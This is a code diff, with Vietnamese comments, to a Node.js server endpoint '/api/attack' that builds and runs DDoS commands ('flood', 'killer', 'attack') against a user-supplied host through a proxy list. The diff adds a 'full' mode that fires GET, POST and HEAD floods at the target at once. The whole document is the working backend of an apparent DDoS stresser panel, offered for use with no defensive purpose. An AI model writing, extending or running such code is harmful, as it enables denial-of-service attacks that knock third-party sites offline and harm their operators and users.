@@ -93,7 +93,7 @@ app.get("/api/attack", (req, res) => {
 
   activeAttacks++;
 
-  // Tạo lệnh tấn công dựa trên phương thức
+  // Các lệnh tấn công cho phương thức cụ thể
   const commands = {
     "flood": `node --max-old-space-size=65536 flood ${host} ${time} 10 10 live.txt flood`,
     "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
@@ -102,6 +102,27 @@ app.get("/api/attack", (req, res) => {
     "attack": `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --randrate true --ratelimit true --full true --close true -F true --debug false`
   };
 
+  // Nếu modul=full, chạy tất cả các lệnh GET, POST, HEAD
+  if (modul === "full") {
+    const fullCommands = [
+      `node --max-old-space-size=65536 attack -m GET -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --randrate true --ratelimit true --full true --close true -F true --debug false`,
+      `node --max-old-space-size=65536 attack -m POST -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --randrate true --ratelimit true --full true --close true -F true --debug false`,
+      `node --max-old-space-size=65536 attack -m HEAD -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --randrate true --ratelimit true --full true --close true -F true --debug false`
+    ];
+
+    // Thực thi các lệnh cho full
+    fullCommands.forEach((command) => executeAttack(command, clientIP));
+    return res.status(200).json({
+      status: "success",
+      message: "Đã gửi tất cả các lệnh tấn công GET, POST, HEAD",
+      host,
+      port,
+      time,
+      method
+    });
+  }
+
+  // Nếu modul không phải "full", thực thi lệnh tấn công theo phương thức đã chọn
   const command = commands[method.toLowerCase()];
   if (!command) {
     return res.status(400).json({ status: "error", message: "Phương thức tấn công không hợp lệ" });
